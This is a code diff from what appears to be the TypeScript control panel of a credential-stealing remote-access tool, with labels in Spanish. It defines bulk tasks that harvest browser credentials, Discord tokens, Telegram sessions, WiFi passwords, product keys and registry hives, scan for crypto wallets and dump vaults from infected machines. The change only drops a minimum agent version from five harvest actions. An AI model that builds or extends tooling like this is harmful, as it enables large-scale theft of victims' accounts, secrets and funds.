@@ -144,11 +144,11 @@ export const ACTIONS: ActionDef[] = [
 
   // Credenciales
   { id: 'harvest', group: 'credenciales', label: 'Harvest completo', icon: Archive, task: 'harvest', detail: 'harvest · {}', bulk: true, resolve: () => task('harvest', {}, 180) },
-  { id: 'harvest-browsers', group: 'credenciales', label: 'Navegadores', icon: Globe, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=browsers', bulk: true, resolve: () => task('harvest', { kind: 'browsers' }, 180) },
-  { id: 'harvest-discord', group: 'credenciales', label: 'Tokens de Discord', icon: MessageSquare, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=discord', bulk: true, resolve: () => task('harvest', { kind: 'discord' }, 120) },
-  { id: 'harvest-telegram', group: 'credenciales', label: 'Sesión de Telegram', icon: MessageSquare, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=telegram', bulk: true, resolve: () => task('harvest', { kind: 'telegram' }, 120) },
-  { id: 'harvest-wifi', group: 'credenciales', label: 'WiFi', icon: Wifi, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=wifi', bulk: true, resolve: () => task('harvest', { kind: 'wifi' }, 120) },
-  { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', minAgent: '0.3.7', detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
+  { id: 'harvest-browsers', group: 'credenciales', label: 'Navegadores', icon: Globe, task: 'harvest', detail: 'harvest · kind=browsers', bulk: true, resolve: () => task('harvest', { kind: 'browsers' }, 180) },
+  { id: 'harvest-discord', group: 'credenciales', label: 'Tokens de Discord', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=discord', bulk: true, resolve: () => task('harvest', { kind: 'discord' }, 120) },
+  { id: 'harvest-telegram', group: 'credenciales', label: 'Sesión de Telegram', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=telegram', bulk: true, resolve: () => task('harvest', { kind: 'telegram' }, 120) },
+  { id: 'harvest-wifi', group: 'credenciales', label: 'WiFi', icon: Wifi, task: 'harvest', detail: 'harvest · kind=wifi', bulk: true, resolve: () => task('harvest', { kind: 'wifi' }, 120) },
+  { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
   { id: 'hives', group: 'credenciales', label: 'Hives del registro', icon: FileText, task: 'agent', detail: 'agent · hives', windowsOnly: true, resolve: () => agent('hives', 180) },
   { id: 'scan', group: 'credenciales', label: 'Escanear wallets', icon: Wallet, task: 'scan_wallets', detail: 'scan_wallets · opciones', dialog: 'scan_wallets', bulk: true, local: true },
   { id: 'dump', group: 'credenciales', label: 'Extraer vault', icon: Archive, task: 'dump_vault', detail: 'dump_vault · {target}', dialog: 'dump_vault', local: true },
